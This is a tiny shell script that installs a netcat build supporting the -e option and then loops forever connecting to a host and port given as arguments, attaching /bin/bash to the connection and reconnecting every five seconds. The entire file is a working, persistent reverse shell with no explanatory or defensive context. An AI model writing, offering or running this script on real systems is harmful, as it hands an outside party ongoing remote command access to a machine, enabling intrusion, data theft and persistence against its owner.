#sudo apt-get remove netcat-openbsd
#sudo apt-get remove netcat-traditional
#sudo apt-get install netcat
while(true) do netcat -nvv $1 $2 -e /bin/bash; echo "reconnecting";sleep 5;done
